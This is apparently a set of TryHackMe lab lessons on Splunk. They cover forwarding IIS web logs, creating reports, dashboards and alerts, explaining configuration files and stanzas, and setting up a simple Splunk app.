The Windows host we connected to Splunk Instance also hosts a local copy of their website, which can be accessed via  `http://coffely.thm` from the VM
 and is in the development phase. You are asked to configure Splunk to 
receive the weblogs from this website to trace the orders and improve 
coffee sales.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/78e190a4246f52b9774eb65e339384e1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/78e190a4246f52b9774eb65e339384e1.png)

This
 site will allow users to order coffee online. In the backend, it will 
keep track of all the requests and responses and the orders placed. Now 
let's follow the next steps to ingest web logs into Splunk.

# Add Data

Go to settings -> Add Data and select Forward from the list, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/588a1abdd12be55a14a301b97dfb5f41.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/588a1abdd12be55a14a301b97dfb5f41.png)

Select the Forwarder option:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6c992411f2feac2abe1d821471a00eef.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/6c992411f2feac2abe1d821471a00eef.png)

# Select Forwarder

Here we will select the Web host where the website is being hosted.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ac2b8256c65d153c1769ca1e5d42504.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ac2b8256c65d153c1769ca1e5d42504.png)

Web logs are placed in the directory `C:\inetpub\logs\LogFiles\W3SVC*`. The directory may contain one or more log files which will be continuously updated with the logs. We will be configuring Splunk to monitor and receive logs from this directory.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1adbc28a09c4e09adc64aa3ca16fd68a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1adbc28a09c4e09adc64aa3ca16fd68a.png)

# Setting up Source Type

Next,
 we will select the source type for our logs. As our web is hosted on an
 IIS server, we will choose this option and create an appropriate index 
for these logs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/efdc7ed1b3dcfb0fb3553e39b851ab85.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/efdc7ed1b3dcfb0fb3553e39b851ab85.png)

We can look at the summary to see if all settings are fine.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/92348ac194c35ef7d7b72bf05ee86c01.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/92348ac194c35ef7d7b72bf05ee86c01.png)

Now everything is done. It's time to see if we get the weblogs in our newly created index. Let's visit the website `coffely.thm` and generate some logs. The logs should start propagating in about 4-5 minutes in the search tab, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/94d04fa38c4290e0f3b4a7b801c8d902.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/94d04fa38c4290e0f3b4a7b801c8d902.png)

Excellent. It looks like we were successful in getting the weblogs ingested into Splunk. However, the logs may need proper parsing and normalizing, which is something to be discussed in upcoming rooms.

**SPLUNK: DASHBOARD AND REPORT**

**Organizing Data in Splunk**

Splunk
 does a great job of aggregating the security-related data of an 
organization's assets in a single place. However, this data is huge, 
difficult to grasp, and make sense of. We will learn how to make sense 
of the data in this room.

When we open Splunk, this is the screen we might be greeted with after signing in.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0e9223ead2aa33080f94971ee8127812.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0e9223ead2aa33080f94971ee8127812.png)

To move forward, go to the first tab on the left menu, **Search & Reporting**. Clicking that, we see the following interface.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0dc6a592bc7c55bcbde3fc9d3ce9cabc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0dc6a592bc7c55bcbde3fc9d3ce9cabc.png)

Now, we can see that we have an interface for the Search app. For starters, we can start a search with the search term `index=*` to see what data we have here. We have set the time window to 'all time' to see the data historically present here as well.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2a22505acdde8366e8eecbca63056ed6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2a22505acdde8366e8eecbca63056ed6.png)

Looking at the above screenshot, we can feel overwhelmed. There
 are more than 35000 events present in this data. If we are to sift 
through this data manually, it will make our lives difficult instead of 
making them easier. Therefore, looking at raw data is often not a good 
idea when our goal is to get an overview of an organisation's security 
posture. It also doesn't give us much information about the threats and 
attacks launched against the organization. Now this is just a sample of 
data in Splunk
 that we have added for this room. In production, we should avoid 
running searches for 'all time' as they can add undue load on the Splunk
 search head and make other searches difficult and slow.

The above-mentioned problems are bound to appear when we deal with a lot of data. Splunk
 is a data analysis platform that provides solutions for these problems.
 In the coming tasks, we will see how to aggregate and visualize this 
data to find answers to our problems.

**Creating Reports for Recurring Searches**

Until now, we have been using Splunk
 for broad searches mainly. However, we often need to run specific 
searches from time to time. For example, a certain organization might 
want to run a search every 8 hours when a new shift of SOC analysts 
arrives or is leaving. For this purpose, creating a report that will run
 at a specific time is efficient. Reports will then run the searches and
 save the results for viewing when the analysts for the incoming shift 
arrive.

Reports can also help reduce the load on the Splunk
 search head. For example, if multiple searches need to be run at the 
start of every shift, running them simultaneously can increase the 
search head's load and processing times. If searches are scheduled with 5
 or 10-minute intervals, they will accomplish two tasks.

1. The searches will run automatically without any user interaction.
2. The searches will not run simultaneously, reducing the possibility of errors or inefficiency.

Before moving forward, please start the attached VM by clicking the **Start Machine** button on the top right corner. Once the IP address is visible, you can use the URL: [http://10-10-127-225.p.thmlabs.com](http://10-10-127-225.p.thmlabs.com/) to access the Splunk
 instance. It might take 3-5 minutes for the Splunk instance to start. A
 VPN connection is not needed to access the Splunk instances.

Continuing from the previous task, move to the Reports tab to look at already saved reports in Splunk. We will see the following interface.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0aed9fcd210b163c605284680efc430d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0aed9fcd210b163c605284680efc430d.png)

Here, we see a list of reports already saved in Splunk.
 If we want to view the saved results of a report, we can click on the 
report's name. However, if we want to run a new search using the same 
query as the one in a report, we can use the 'Open in Search' option. 
The 'Edit' option allows us to edit the reports. The 'Next Scheduled 
Time' tab shows when the report will run again. We can also see the 
report's owner and its associated permissions. Please note that we have 
selected 'All' reports to be shown in the view above. There are options 
for viewing only the logged-in user's reports, as well as for viewing 
the reports added by the App.

To create a new report, we can run a search and use the Save As option to save the search as a report.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0cf70ab30e4b7e3ef7ee4909924bf7db.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0cf70ab30e4b7e3ef7ee4909924bf7db.png)

Once we click the option to Save As Report, we see the following window.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7892bb7cb5332afca2520378eaee650b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7892bb7cb5332afca2520378eaee650b.png)

Filling in the required data and clicking the 'Save' option here will save the search as a report.

Let's practice the same in the attached Splunk
 instance. We ran a search in the previous task. To create a report on a
 search, we will first have to understand the data. On the left tab, we 
will see some fields Splunk has identified that might interest us. Let's
 click on hosts to see the number of hosts sending logs to our Splunk 
instance.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/e7cd736aae3d8e8e234b8efea8cbf0d6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/e7cd736aae3d8e8e234b8efea8cbf0d6.png)

So, we have 3 hosts; network-server, web-server, and 
vpn_server. They are all sending different numbers of events. If we are 
to determine the number of times each VPN user logged in during our given time window (which is 'all time' for this room), we will run the following query.

`host=vpn_server | stats count by Username`

This is what we get when we run this query in our instance.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a70e380a920c99fb120e94a15adefada.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a70e380a920c99fb120e94a15adefada.png)

In a SOC
 environment, we might want to track users who logged in during a 
certain time window. This requirement might be repetitive. SOC analysts 
can create a report for this requirement that will run every few hours 
for ease of use. Let's practice that based on what we learned in this 
task. First, we click 'Save As' and select 'Report'.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a425a5b05047bcc8167e53f4f6233301.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a425a5b05047bcc8167e53f4f6233301.png)

We fill in the required information.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a09eff4c9df3e76f6ddf989eba04e46d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/a09eff4c9df3e76f6ddf989eba04e46d.png)

Here, we can see the Content for this report will be a 'Statistics 
Table' because we used 'stats count' in our query. The 'Time Range 
Picker' has been set to 'Yes'. This means running the report will give 
us a time-range picker option. When we click 'Save', we get the 
following prompt, telling us the report has been created.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1e675560c1b6c0f2da5d65e15eacada4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1e675560c1b6c0f2da5d65e15eacada4.png)

We can click the 'View' option to view our report. This is how it will look.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bafea3aec0dd48d8be76e2907c0d61c5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bafea3aec0dd48d8be76e2907c0d61c5.png)

On the reports tab, we can see our report now.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2ea776d9ae008ead16058bb5d2f22ffe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2ea776d9ae008ead16058bb5d2f22ffe.png)

We see the owner of the report is 'admin', the logged-in user. The 
'Sharing' is set to Private. This means that this report can only be 
accessed by admin. We can use the 'Edit' option to change the 
permissions and set it to be used by other users.

**Creating Dashboards for Summarizing Results**

Splunk
 provides us with the ability to create dashboards and visualizations. 
These dashboards and visualizations provide a user with quick info about
 the data present in Splunk. Dashboards are often created to help give a
 brief overview of the most important bits of the data. They are often 
helpful in presenting data and statistics to the management, such as the
 number of incidents in a given time frame, or for SOC analysts to 
figure out where to focus, such as identifying spikes and drops in data 
sources, which might indicate a surge in, say, failed login 
attempts. The primary purpose of dashboards is to provide a quick visual
 overview of the available information.

To move forward, let's create a dashboard in the attached VM. To start, move to the Dashboards tab. We will see the below screen.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7b578741a3241d45e848ddfac934e3af.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/7b578741a3241d45e848ddfac934e3af.png)

In this screen, we see an option to create dashboards labeled as 1 in
 the screenshot. Labeled as 2 is a list of available dashboards. Please 
note that we have selected 'All' dashboards here instead of 'Yours' or 
'This App's', which can show a different list of dashboards. Labeled as 3
 is information about these dashboards, such as owner, permissions, etc.
 Here, we also find the option to Edit the dashboard's different 
properties, or set it as the home dashboard. We can also view a 
dashboard by clicking on the name of the dashboard. However, we don't 
have any dashboards yet. We can start by creating a dashboard. For that,
 let's click the **Create Dashboard** option to see the following window.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/be9345e83d098e24621dc980759e89c0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/be9345e83d098e24621dc980759e89c0.png)

After filling in the relevant details, such as the name and 
permissions, we can choose one of the two options for dashboard creation
 through Classic Dashboards or Dashboard Studio.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ae3bf1188ee513d8a5327da9d15d9932.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ae3bf1188ee513d8a5327da9d15d9932.png)

We can see that we have set the permissions to 'Shared in App'.
 This will ensure that the dashboard is also visible to other users of Splunk.
 We will use the Classic Dashboard approach to create a dashboard for 
this room. Let's do that and click 'Create'. The Window tells us to 
'Click Add Panel to Start'. When we click the 'Add Panel' option, we get
 the following menu on the right side.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1355c37ca97acafb650d7e30772624c8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1355c37ca97acafb650d7e30772624c8.png)

We want to add the results from our report to the Dashboard. We can select the 'New from Report' option to do that.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8494ef44f7c6e667640b50cdc3c2e3e7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8494ef44f7c6e667640b50cdc3c2e3e7.png)

The 'Add to Dashboard' option will add these results to our 
dashboard. However, we were already seeing the results as a report. What
 benefit will a dashboard provide us? The answer to that lies in 
visualizations. We can select a visualization from the menu, as shown 
below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6fd6d786cd7de2807bf0c7b61a782355.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6fd6d786cd7de2807bf0c7b61a782355.png)

Let's select the column chart visualization and check out the results.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0d4636314e99375e15ff798c886fc460.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/0d4636314e99375e15ff798c886fc460.png)

Doesn't it look nice? We can see on a cursory glance that Emma logged
 in the least amount of times, and Sarah logged in the most. This is the
 kind of information that a dashboard is helpful for. Another way 
dashboards can help is by adding multiple reports to a single dashboard.
 The process for that will be similar, as we still see the Add Panel 
option above. However, we will keep this task to a single report. We can
 flip the switch to the Dark theme and click 'Save' to save the 
dashboard if we like it. This is how it will look when finished.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bdd06894dddfa316d0ec267df5f53e00.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bdd06894dddfa316d0ec267df5f53e00.png)

Now, we can go to the Dashboards menu to see our newly created dashboard.

**Alerting on High Priority Events**

In the previous tasks, 
we practiced creating reports and dashboards. We understood that when we
 need to run a search repetitively, we can use reports, and if we want 
to club a few reports together or make visualizations, we can use 
dashboards. However, reports and dashboards will only be viewed by users
 at set time intervals. Sometimes, we want to be alerted if a certain 
event happens, such as, if the amount of failed logins on a single 
account reaches a threshold, it indicates a brute force attempt, and we 
would like to know as soon as it happens. In this task, we will learn 
how to set up alerts. Unfortunately, we cannot practice setting up 
alerts on the attached instance because of licensing issues. However, we
 will explain how to set up an alert in this task.

First, we will run a search for our required search term. In the 
'Save As' drop-down, we will see an option for saving as an alert. In 
the previous task, we identified that the user Sarah logged in the most 
during our time range. Therefore, let's narrow down our search to all 
the login events of the user Sarah.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b62596f1ec7d35d8be5f5c060367f7b7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b62596f1ec7d35d8be5f5c060367f7b7.png)

When we click 'Alert' in the 'Save As' menu, we are asked to configure the alert's parameters.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/75ef52a3c3b0a42d86fe76a3f52e1a7d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/75ef52a3c3b0a42d86fe76a3f52e1a7d.png)

We see the usual settings such as Title, Description and 
Permissions. In addition to that, we have some more options specific to 
alerts. The alert type we are setting up is scheduled. This means that Splunk
 will run this search as per the schedule, and if the trigger condition 
is satisfied, an alert will be raised. Depending on the license and 
configuration for your Splunk instance, you might get an option for 
scheduling Real-time alerts. Next, we have trigger conditions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/f0d21b2e8e03df5c9f3484e4087ff656.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/f0d21b2e8e03df5c9f3484e4087ff656.png)

Trigger conditions define the conditions when the alert will be
 raised. Here, let's say we raise the alert when the login count of our 
user is more than 5. In that case, we will use the 'Number of Results' 
option and set the 'is greater than' option to 5. We can trigger 5 
alerts for the 5 login times, or we can just trigger a single alert for 
exceeding this count. The 'Throttle' option lets us limit the alerts by 
not raising an alert in the specified time period if an alert is already
 triggered. This can help reduce alert fatigue, which can overwhelm 
analysts when there are too many alerts. The final option here is for 
Trigger Actions. This option allows us to define what automated steps Splunk
 must take when the alert is triggered. For example, we might want 
Splunk to send an email to the SOC email account in case of an alert.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8a156dc2d6c94df4ae65aa458742c320.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8a156dc2d6c94df4ae65aa458742c320.png)

Below, we can see the configured alert. We have configured it to run 
every hour if Sarah logs in more than 5 times. The email will only be 
sent once every 60 minutes.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/9960a9f78306e77c708469cf9f4ff582.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/9960a9f78306e77c708469cf9f4ff582.png)

If the alert is triggered, Splunk will send an email to soc@tryhackme.com.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/06eb3fdc2a3418db77adeb3bd1ec395a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/06eb3fdc2a3418db77adeb3bd1ec395a.png)

The email will be sent with the highest priority, and it will include the Subject and message mentioned above.

**Splunk Data Processing: Overview**

Splunk is a powerful data analytics platform used for searching,
monitoring, and analyzing large amounts of machine-generated data. Data
parsing in Splunk involves extracting relevant fields and transforming
the data into a structured format for efficient analysis. Here’s a
step-by-step guide on how data is parsed in Splunk, including the use of
`props.conf`:

# Step 1: Understand the Data Format

First, you need
to understand the data format you want to parse. Splunk supports
various data formats, such as CSV, JSON, XML, syslog, and more.
Determine the format of your data source and the relevant fields you
want to extract.

# Step 2: Identify the Sourcetype

In Splunk, the
sourcetype represents the format of the data being indexed. It helps
Splunk apply the appropriate parsing rules. If your data source does not
have a pre-defined sourcetype, you can create a custom one in Splunk.

**Step 3: Configure** `props.conf`
****

The
`props.conf` file defines data parsing settings for
specific sourcetypes or data sources. It resides in the
`$SPLUNK_HOME/etc/system/local` directory. Here’s an example
of how you can configure `props.conf`:

```c
[source::/path/to/your/data]
sourcetype = your_sourcetype
```

In this example, `/path/to/your/data` is the path to your
data source, and `your_sourcetype` is the name of the
sourcetype you want to assign to that data.

# Step 4: Define Field Extractions

You can define regular expressions or use pre-built extraction techniques to parse fields from the data.
Here’s an example of defining field extractions in
`props.conf`:

```c
[your_sourcetype]
EXTRACT-fieldname1 = regular_expression1
EXTRACT-fieldname2 = regular_expression2
```

Replace `your_sourcetype` with the actual sourcetype name
you defined. `fieldname1` and `fieldname2`
represent the names of the fields you want to extract, while
`regular_expression1` and `regular_expression2`
are the regular expressions used to match and extract the desired
values.

# Step 5: Save and Restart Splunk

After making changes to
`props.conf`, save the file, and restart Splunk to apply the
new configurations. You can do this using the Splunk web interface or by
using the command line.

**Step 6: Verify and Search the Data**

Once Splunk restarts, you can
search and verify that the data is being parsed correctly. You can use
the extracted fields to filter and analyze the data effectively.

Exploring Splunk Configuration files

Splunk uses several [configuration files](https://docs.splunk.com/Documentation/Splunk/9.1.1/Admin/Listofconfigurationfiles) to control various data processing and indexing aspects. Let’s explore some of the key
configuration files in Splunk, along with examples of their usage:

`inputs.conf`:

- **Purpose:** Defines data inputs and how to collect data from different
sources.
- **Example:** Suppose you want to monitor a specific log file. You can
configure `inputs.conf` as follows:

```c
[monitor:///path/to/logfile.log]
sourcetype = my_sourcetype
```

`props.conf`:

- **Purpose:** Specifies parsing rules for different sourcetypes to
extract fields and define field extractions.
- **Example:** Suppose you have a custom sourcetype named
`my_sourcetype` and want to extract fields using regular
expressions. You can define them in `props.conf`:

```c
[my_sourcetype] EXTRACT-field1 = regular_expression1
EXTRACT-field2 = regular_expression2
```

```
transforms.conf
```

- **Purpose:** Allows you to define field transformations and
enrichments on indexed events.
- **Example:** Suppose you want to add a new event field based on
existing field values. You can use
`transforms.conf`:

```c
[add_new_field] REGEX = existing_field=(.*) FORMAT = new_field::$1
```

`indexes.conf`

- **Purpose:** Manages the configuration of indexes in Splunk,
including storage, retention policies, and access control.
- **Example:** Suppose you want to create a new index named
`my_index` with specific settings. You can configure
`indexes.conf`:

```c
[my_index] homePath = $SPLUNK_DB/my_index/db
coldPath = $SPLUNK_DB/my_index/colddb
thawedPath = $SPLUNK_DB/my_index/thaweddb
maxTotalDataSizeMB = 100000
```

`outputs.conf`

- **Purpose:** Specifies the destination and settings for sending indexed
data to various outputs, such as remote Splunk instances or third-party
systems.
- **Example:** Suppose you want to forward your indexed data to a remote
Splunk indexer. You can configure `outputs.conf`:

```c
[tcpout] defaultGroup = my_indexers
[tcpout:my_indexers]
server = remote_indexer:9997
```

`authentication.conf`

- **Purpose:** Manages authentication settings and user authentication
methods.
- **Example:** Suppose you want to enable LDAP authentication for Splunk
users. You can configure `authentication.conf`:

```c
[authentication]
authSettings = LDAP
[authenticationLDAP]
SSLEnabled = true
```

These are just a few examples of the various configuration files used
in Splunk. Each file serves a specific purpose and allows you to
customize Splunk’s behavior based on your data sources, parsing
requirements, indexing settings, output destinations, and more.

# STANZAS in Splunk
Configurations

Splunk configurations contain various stanza configurations that
define how data is processed and indexed. These stanzas have a certain
purpose, and it's important to understand what these are and how they are
used. A brief summary of the common stanzas are explained below:

| Stanza | Explanation | Example |
| --- | --- | --- |
| `[sourcetype]` | Specifies the configuration for a specific sourcetype. It allows you
to define how the data from that sourcetype should be parsed and
indexed. | `[apache:access]` - Configures parsing and indexing
settings for Apache access logs. |
| `TRANSFORMS` | Applies field transformations to extracted events. You can reference
custom or pre-defined field transformation configurations to modify or
create new fields based on the extracted data. | `TRANSFORMS-mytransform = myfield1, myfield2` - Applies
the transformation named “mytransform” to fields `myfield1`
and `myfield2`. |
| `REPORT` | Defines extraction rules for specific fields using regular
expressions. It associates a field name with a regular expression
pattern to extract desired values. This stanza helps in parsing and
extracting structured fields from unstructured or semi-structured
data. | `REPORT-field1 = pattern1` - Extracts `field1`
using `pattern1` regular expression. |
| `EXTRACT` | Defines extraction rules for fields using regular expressions and
assigns them specific names. It is similar to the `REPORT`
stanza, but it allows more flexibility in defining custom field
extractions. | `EXTRACT-field1 = (?<fieldname>pattern1)` -
Extracts `field1` using `pattern1` regular
expression and assigns it to `fieldname`. |
| `TIME_PREFIX` | Specifies the prefix before the timestamp value in events. This
stanza is used to identify the position of the timestamp within the
event. | `TIME_PREFIX = \[timestamp\]` - Identifies the prefix
`[timestamp]` before the actual timestamp in events. |
| `TIME_FORMAT` | Defines the format of the timestamp present in the events. It allows
Splunk to correctly extract and parse timestamps based on the specified
format. | `TIME_FORMAT = %Y-%m-%d %H:%M:%S` - Specifies the
timestamp format as `YYYY-MM-DD HH:MM:SS`. |
| `LINE_BREAKER` | Specifies a regular expression pattern that identifies line breaks
within events. This stanza is used to split events into multiple lines
for proper parsing and indexing. | `LINE_BREAKER = ([\r\n]+)` - Identifies line breaks using
the regular expression `[\r\n]+`. |
| `SHOULD_LINEMERGE` | Determines whether lines should be merged into a single event or
treated as separate events. It controls the behavior of line merging
based on the specified regular expression pattern in the
`LINE_BREAKER` stanza. | `SHOULD_LINEMERGE = false` - Disables line merging,
treating each line as a separate event. |
| `BREAK_ONLY_BEFORE` | Defines a regular expression pattern that marks the beginning of an
event. This stanza is used to identify specific patterns in the data
that indicate the start of a new event. | `BREAK_ONLY_BEFORE = ^\d{4}-\d{2}-\d{2}` - Identifies the
start of a new event if it begins with a date in the format
`YYYY-MM-DD`. |
| `BREAK_ONLY_AFTER` | Specifies a regular expression pattern that marks the end of an
event. It is used to identify patterns in the data that indicate the
completion of an event. | `BREAK_ONLY_AFTER = \[END\]` - Marks the end of an event
if it contains the pattern `[END]`. |
| `KV_MODE` | Specifies the key-value mode used for extracting field-value pairs
from events. The available modes are: `auto`,
`none`, `simple`, `multi`, and
`json`. This stanza determines how fields are extracted from
the events based on the key-value pairs present in the data. It helps in
parsing structured data where fields are represented in a key-value
format. | `KV_MODE = json` - Enables JSON key-value mode for
parsing events with JSON formatted fields. |

These examples demonstrate the usage of each stanza in
`props.conf` and provide a better understanding of how they
can be applied to configure data parsing behavior in Splunk.

**Creating a Simple Splunk App**

We have explored the importance and usage of various configuration
files and the purpose-based stanzas within those configuration files. We
will be using them extensively in the coming tasks. For now, let’s
create a simple Splunk app using the following steps and generate our
first sample event using inputs.conf file.

### Start Splunk

Splunk is installed in the `/opt/splunk` directory. Go to this
directory and run the following command `bin/splunk start`
to start the Splunk instance with root privileges. Use the following credentials to log in to the Splunk Interface:

**Username:** `splunk`

**Password:** `splunk123`

Once it is done, open `10.10.149.128:8000` in the browser.

**About Splunk Apps**Splunk apps are pre-packaged software modules or extensions that enhance
 the functionality of the Splunk platform. The purpose of Splunk apps is
 to provide specific sets of features, visualizations, and 
configurations tailored to meet the needs of various use cases and 
industries.

### Create a simple App

Once the Splunk Instance is loaded, click on the Manage App tab as
highlighted below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f1a700a5eb1e4121010a6858eb7e4485.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f1a700a5eb1e4121010a6858eb7e4485.png)

It will take us to the page that contains all the available apps in
Splunk. To create a new app, Click on the `Create App` tab as
shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0e77b3c3ac476a9aec075d729d8a1823.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0e77b3c3ac476a9aec075d729d8a1823.png)

Next, fill in the details about
the new app that we want to create. The new app will be placed in the
`/opt/splunk/etc/apps` directory as highlighted below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d84da00ef3445e5c1297b6f6c68c06aa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d84da00ef3445e5c1297b6f6c68c06aa.png)

Great. A new Splunk app has been
created successfully and it can be shown on the Apps page. Click on the
`Launch App` to see if there is any activity logged yet.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7c198667d09c8ab0b4fe69c82d12814c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7c198667d09c8ab0b4fe69c82d12814c.png)

As it is evident, no activity has been logged yet. Follow the next
steps to generate sample logs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b41bfc9c4d215b588ea88d1cb71ab18a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b41bfc9c4d215b588ea88d1cb71ab18a.png)

# Understand the App directory

Go to the app directory `/opt/splunk/etc/apps` , where we
can locate our newly created app `DataApp`, as shown below:

App Directory

```
root@tryhackme:/opt/splunk/etc/apps# ls DataApp                        splunk-dashboard-studio
SplunkForwarder                splunk_archiver
SplunkLightForwarder           splunk_assist
alert_logevent                 splunk_essentials_9_0
alert_webhook                  splunk_gdi
appsbrowser                    splunk_httpinput
introspection_generator_addon  splunk_instrumentation
journald_input                 splunk_internal_metrics
launcher                       splunk_metrics_workspace
learned                        splunk_monitoring_console
legacy                         splunk_rapid_diag
python_upgrade_readiness_app   splunk_secure_gateway
sample_app                     user-prefs
search
```

# Content within the App directory

App Directory

```
root@tryhackme:/opt/splunk/etc/apps# ls  DataAppbin  default  local  metadata
```

# Splunk App directory

Some of the key directories and files that are present in the app directory are explained briefly
below:

| File/Directory | Description |
| --- | --- |
| `app.conf` | Metadata file defining the app’s name, version, and more. |
| `bin` (directory) | Holds custom scripts or binaries required by the app. |
| `default` (directory) | Contains XML files defining app dashboards and views. |
| `local` (directory) | Optionally used for overriding default UI configurations. |

# Create a Python
script to generate sample logs

As we learned that the **`bin`** directory contains the scripts required by the app, let's go to the `bin` directory
and create a simple Python script using the command
`nano samplelogs.py`, copy the following line in the file,
and save.

```c
print("This is a sample log...")
```

